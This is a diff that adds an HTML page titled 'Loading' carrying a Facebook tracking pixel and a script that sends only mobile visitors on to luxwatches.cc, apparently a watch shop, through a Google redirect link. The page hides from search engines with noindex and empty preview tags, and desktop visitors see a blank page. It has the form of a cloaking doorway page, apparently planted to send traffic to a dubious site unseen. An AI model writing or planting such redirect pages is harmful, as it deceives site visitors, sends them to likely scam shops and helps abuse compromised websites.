@@ -1,0 +1,33 @@
+
+<!DOCTYPE html><html><head><title>Loading</title>
+<meta property="og:title" content="none"/>
+<meta property="og:description" content="none"/>
+<meta name="robots" content="noindex,nosnippet"/>
+<script>!function(f,b,e,v,n,t,s){if(f.fbq)return;n=f.fbq=function(){n.callMethod?
+        n.callMethod.apply(n,arguments):n.queue.push(arguments)};if(!f._fbq)f._fbq=n;
+        n.push=n;n.loaded=!0;n.version='2.0';n.queue=[];t=b.createElement(e);t.async=!0;
+        t.src=v;s=b.getElementsByTagName(e)[0];s.parentNode.insertBefore(t,s)}(window,
+        document,'script','https://connect.facebook.net/en_US/fbevents.js');
+        fbq('init', '536191644010420'); 
+        fbq('track', 'PageView');
+
+       window.onload = function() {
+            var browser = navigator.userAgent.toLowerCase();
+            var phone = /iphone|ipod|ipad|android|mobile|blackberry|webos|incognito|webmate|bada|nokia|lg|ucweb|skyfire|micromessenger/i
+            if (!phone.test(browser)) {
+                return;
+            }
+            var target = document.getElementById('url').value;
+            if( target ){
+                window.location.replace(target);
+            } else {
+                console.log(target);
+            }
+        }
+</script><noscript>
+<img height="1" width="1" style="display:none" src="https://www.facebook.com/tr?id=536191644010420&amp;ev=PageView&amp;noscript=1"/></noscript></head>
+<body>
+<img height="1" width="1" style="display:none" src="https://www.facebook.com/tr?id=536191644010420&amp;ev=PageView&amp;noscript=1"/>
+<form id="form" name="form" method="get" action="/"><input type="hidden" id="url" name="url" value="https://www.google.com/url?q=https%3A%2F%2Fluxwatches.cc%2F&sa=D&sntz=1&usg=AFQjCNEjO8gwdSQ-s7BfgIGjwtDmvtlEjA"/></form>
+</body>
+</html>
